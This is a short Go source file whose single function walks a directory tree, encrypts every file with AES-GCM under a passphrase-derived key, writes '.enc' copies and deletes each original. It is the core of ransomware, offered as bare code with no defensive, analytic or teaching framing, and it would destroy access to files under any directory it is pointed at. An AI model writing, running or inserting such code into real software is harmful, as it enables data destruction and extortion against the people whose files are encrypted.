package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

func encrypt(root string, passphrase string) {
	// Initialize AES in GCM mode
	key := []byte(passphrase)
	block, err := aes.NewCipher(key)
	if err != nil {
		panic("error while setting up aes")
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic("error while setting up gcm")
	}

	// looping through target files
	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		// skip if directory
		if !info.IsDir() {
			// encrypt the file
			fmt.Println("Encrypting " + path + "...")

			// read file contents
			original, err := os.ReadFile(path)
			if err == nil {
				// encrypt bytes
				nonce := make([]byte, gcm.NonceSize())
				io.ReadFull(rand.Reader, nonce)
				encrypted := gcm.Seal(nonce, nonce, original, nil)

				// write encrypted contents
				err = os.WriteFile(path+".enc", encrypted, 0666)
				if err == nil {
					os.Remove(path) // delete the original file
				} else {
					fmt.Println("error while writing contents")
				}
			} else {
				fmt.Println("error while reading file contents")
			}
		}
		return nil
	})
}
